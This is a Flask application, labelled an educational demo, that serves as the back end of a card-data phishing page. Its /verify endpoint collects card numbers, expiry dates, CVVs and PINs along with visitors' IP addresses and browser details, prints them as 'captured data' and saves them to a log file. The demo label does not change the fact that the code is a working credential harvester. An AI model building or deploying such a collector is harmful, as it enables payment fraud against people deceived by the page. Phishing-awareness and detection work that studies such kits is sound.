
from flask import Flask, render_template, request, jsonify
import secrets
import json
from datetime import datetime
from model.cognitive import CognitivePhish

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

demo = CognitivePhish()

@app.route("/")
def index():
    now = datetime.now()
    return render_template(
        "index.html",
        fecha_actual=now.strftime("%d/%m/%Y"),
        hora_actual=now.strftime("%H:%M")
    )

# Endpoint que recibe los datos (DEMO EDUCATIVA)

@app.route('/verify', methods=['POST'])
def verify():
    """Endpoint que recibe los datos (DEMO EDUCATIVA)"""
    data = request.get_json(silent=True) or {}

    # Registrar intento con IP y User-Agent
    demo.log_attempt(
        data,
        request.remote_addr,
        request.headers.get("User-Agent", "Desconocido")
    )

    # Mensaje formateado
    log_message = f"""
    {'='*50}
    🔐 DATOS CAPTURADOS (DEMO EDUCATIVA)
    {'='*50}
    📅 Timestamp: {data.get('timestamp')}
    💳 Tarjeta: {data.get('card')}
    📆 Expira: {data.get('expiry')}
    🔢 CVV: {data.get('cvv')}
    🔑 PIN: {data.get('pin')}
    🌐 IP: {request.remote_addr}
    🖥️ User-Agent: {request.headers.get("User-Agent", "Desconocido")}
    {'='*50}
    """

    print(log_message)

    try:
        with open('phishing_demo_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"{json.dumps(data, ensure_ascii=False)}\n")
    except OSError as e:
        print(f"No se pudo escribir el archivo de log: {e}")

    return jsonify({'success': True, 'message': 'Verificación completada'})


if __name__ == '__main__':
    app.run(host=' 127.0.0.1', port=5000, debug=True)
